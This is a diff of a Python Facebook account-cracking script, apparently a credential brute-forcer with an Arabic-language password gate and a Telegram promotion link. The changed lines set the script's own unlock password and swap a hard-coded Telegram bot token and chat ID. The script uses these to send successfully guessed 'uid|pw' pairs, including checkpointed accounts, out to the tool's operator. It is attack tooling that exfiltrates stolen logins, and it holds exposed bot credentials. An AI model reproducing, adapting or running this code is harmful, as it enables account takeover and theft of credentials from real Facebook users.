@@ -1,5 +1,24 @@
 import webbrowser
 webbrowser.open('https://t.me/nader20090')
+print('\033[1;32m')
+print('-----------------------------------------------------------')
+print('                           \033[1;31mN\033[1;32mA\033[1;33mD\033[1;34mE\033[1;35mR\033[1;32m')
+print('-----------------------------------------------------------')
+print('-----------------------------------------------------------')
+print('\033[1;35m ادخل كلمه السر')
+print('\033[1;32m')
+print('-----------------------------------------------------------')
+print('                           \033[1;31mN\033[1;32mA\033[1;33mD\033[1;34mE\033[1;35mR\033[1;32m')
+print('-----------------------------------------------------------')
+name = input ('Entre password : \033[1;34m')
+print('\033[1;32m')
+print('\033[132m-----------------------------------------------------------')
+if name == '188880' : 
+	print('\033[1;35m كلمه السر صح')
+	print ('اهلا وسهلا بك في اداتي')
+else :
+   print ('\033[1;31m كلمه السر غلط ')
+   exit()
 import webbrowser
 import requests,time,pyfiglet,datetime
 now = datetime.datetime.today()
@@ -1331,7 +1350,7 @@ class Main:
 				print ("\r \033[0;92m Congrats Bro ")
 				
 				self.ok.append("%s|%s"%(uid, pw))
-				token = '6065926852:AAGTgYqvGbKAKqhSjB2WVetHPXgv4IYSOv8'
+				token = '6004741970:AAFmPwkNJMtaHSTPKoRrxruJVw728GoptGw'
 
 				ID = '5868677803'
 				
@@ -1350,7 +1369,7 @@ class Main:
 			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[0;92m\n[\033[1;31mN\033[1;32mA\033[1;33mD\033[1;34mE\033[1;35mR\033[1;36m-\033[1;32mO\033[1;33mK\033[1;35m ] %s | %s\033[0;97m"%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				token = '6065926852:AAGTgYqvGbKAKqhSjB2WVetHPXgv4IYSOv8'
+				token = '6004741970:AAFmPwkNJMtaHSTPKoRrxruJVw728GoptGw'
 
 				ID = '5868677803'
 				
